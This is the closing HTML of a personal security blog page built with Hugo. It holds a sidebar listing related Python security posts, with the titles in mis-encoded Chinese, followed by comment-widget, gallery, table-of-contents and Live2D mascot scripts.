                        data-hash="md5-zLxGz4oDZqCb3/NTQHJVtw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        
        
            <div class="article-image">
                <img src="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.a84481e2accdd7ee83233c01f9ed1648.jpg" 
                        width="3363" 
                        height="5979" 
                        loading="lazy"
                        alt="Featured image of post pickleååºåˆ—åŒ–"
                        
                        data-hash="md5-qESB4qzN1&#43;6DIzwB&#43;e0WSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pickleååºåˆ—åŒ–</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
        
        
            <div class="article-image">
                <img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.dc132e18a0a94c1b0e3d04241faabc01.png" 
                        width="928" 
                        height="1232" 
                        loading="lazy"
                        alt="Featured image of post pythonåŸå‹é“¾æ±¡æŸ“"
                        
                        data-hash="md5-3BMuGKCpTBsOPQQkH6q8AQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonåŸå‹é“¾æ±¡æŸ“</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 æ— æ•Œå¯çˆ±ç¾å’•å™œ
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
